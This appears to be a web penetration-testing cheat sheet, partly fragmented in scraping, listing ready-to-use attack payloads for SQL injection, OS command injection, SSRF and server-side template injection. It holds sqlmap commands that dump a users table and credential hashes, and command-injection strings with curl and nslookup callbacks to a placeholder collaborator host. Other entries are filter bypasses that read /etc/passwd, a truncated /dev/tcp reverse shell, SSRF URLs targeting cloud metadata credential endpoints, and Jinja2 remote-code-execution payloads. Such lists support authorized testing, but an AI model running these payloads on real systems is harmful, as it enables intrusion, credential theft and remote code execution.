sqlmap (only after manual confirmation)# Save the request from Burp first (right-click → Copy to file)
sqlmap -r req.txt --batch --risk=3 --level=5 --dbs --random-agent
sqlmap -r req.txt --batch -D appdb --tables
sqlmap -r req.txt --batch -D appdb -T users --dump --threads=4
  • Confirm injection: ' OR 1=1-- · " OR 1=1-- · numeric 1 OR 1=1 · time-based 1; SELECT SLEEP(5)--
  • Identify injection context: string vs numeric, single vs double quote, after WHERE/ORDER BY
  • DB fingerprint: @@version (MSSQL) · version() (MySQL/Postgres) · banner (Oracle)
  • Column count: ORDER BY 1, 2, 3,... until error
  • UNION extraction: UNION SELECT NULL, table_name, NULL FROM information_schema.tables
  • Blind: boolean diff (AND 1=1 vs AND 1=2) or time-based (SLEEP(5))
  • OOB exfil (no response): LOAD_FILE + DNS callback to Collaborator/oastify
  • Extract credentials table — usernames + password hashes
  • Second-order: payload stored in DB, fires on later read (e.g., username field)
  • Confirm with sqlmap: sqlmap -r req.txt --batch --risk=3 --level=5 --dbs
  • POC complete: minimal request, response showing extracted data, screenshot

3OS Command Injection

CMDi confirmation set# Time-based (works most of the time)
;sleep 5;
|sleep 5;
&amp;sleep 5&amp;
$(sleep 5)
`sleep 5`
%0Asleep%205%0A
%0a/bin/sleep%205

# OOB (Collaborator / oastify)
;curl http://YOUR_OAST.collaborator;
;nslookup unique.YOUR_OAST.collaborator;
;ping -c 3 unique.YOUR_OAST.collaborator;

# Filter bypasses
{cat,/etc/passwd}                # comma trick
$IFS$1cat$IFS/etc/passwd          # IFS for spaces
'wh'oami                          # quote splitting
  • Confirm: ; sleep 5, | sleep 5, & ping -c 5 collab, $(sleep 5), backticks
  • Identify injection context: shell command-line, eval(), exec(), system()
  • Blind via OAST: ; nslookup unique.collaborator.host — DNS hit?
  • Capture output: ; id; whoami; uname -a — what user, what platform?
  • Bypass filters: ${IFS} for spaces, 'who'ami, $@ tricks
  • Privilege check: sudo -l, id, cat /etc/passwd
  • Pivot reachability: nc -zv internal-host 22 80 443
  • Reverse shell (only if explicitly authorized): bash -i >& /dev/tcp/...

# Bypass IP filters

http://2130706433/                     # decimal
http://0x7f.0.0.1/                     # hex
http://[::ffff:127.0.0.1]/             # IPv6-mapped
  • Confirm: point at Collaborator/oastify URL — DNS+HTTP hit?
  • http://127.0.0.1, http://localhost, http://0.0.0.0, http://[::1]
  • AWS metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/
  • If IMDSv2: try X-aws-ec2-metadata-token header forging
  • GCP metadata: http://metadata.google.internal/computeMetadata/v1/?recursive=true with Metadata-Flavor: Google
  • Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 with Metadata: true
  • Bypass filters: decimal IP 2130706433, hex 0x7f000001, 127.1, [::ffff:127.0.0.1]
  • Open-redirect chain: app fetches attacker-controlled URL that 302s to 169.254.169.254
  • Protocol smuggling: gopher://, file://, dict://, ftp://
  • Internal port scan: time-based diff on closed vs open ports

            → 49      = Twig (PHP)

&lt;%= 7*7 %&gt;  → 49      = ERB (Ruby/Rails)
#{7*7}      → 49      = Pug / Slim
@(7*7)      → 49      = Razor (.NET)
Jinja2 RCE (after sandbox escape){{ &apos;&apos;.__class__.__mro__[1].__subclasses__() }}        # find subclass index
{{ &apos;&apos;.__class__.__mro__[1].__subclasses__()[X]("id",shell=True,stdout=-1).communicate() }}

# Newer style:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
  • Confirm: {{7*7}}, ${7*7}, <%= 7*7 %> — 49 in response?
  • Engine fingerprint: Jinja2 {{7*'7'}}=7777777, Twig=49 string, Smarty=49
  • Sandbox escape (Jinja2): {{ ''.__class__.__mro__[1].__subclasses__() }}
  • RCE chain: full payload that runs id or pings Collaborator
  • If client-side template (AngularJS/Vue): CSTI via {{constructor.constructor('alert(1)')()}}
